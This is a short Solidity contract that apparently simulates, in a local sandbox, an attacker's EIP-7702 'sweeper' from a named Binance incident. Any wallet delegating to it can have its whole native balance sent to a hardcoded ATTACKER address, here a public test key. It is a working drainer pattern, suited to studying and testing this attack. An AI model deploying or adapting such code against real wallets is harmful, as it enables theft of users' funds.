// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

/// @notice Demo stand-in for the attacker "sweeper" from the Binance incident.
/// A hot wallet that delegates to this code (EIP-7702) can be emptied by ATTACKER only.
/// Delegated code runs on the wallet's own storage, so everything is a constant:
/// no constructor, no storage reads.
contract MockSweeper {
    /// Anvil mnemonic account #2 (public test key, sandbox only).
    address public constant ATTACKER = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC;

    error NotAttacker();
    error SweepFailed();

    modifier onlyAttacker() {
        if (msg.sender != ATTACKER) revert NotAttacker();
        _;
    }

    /// Sends the full native balance of the delegated wallet to ATTACKER.
    function sweep() external onlyAttacker {
        (bool ok,) = ATTACKER.call{value: address(this).balance}("");
        if (!ok) revert SweepFailed();
    }

    receive() external payable {}
}
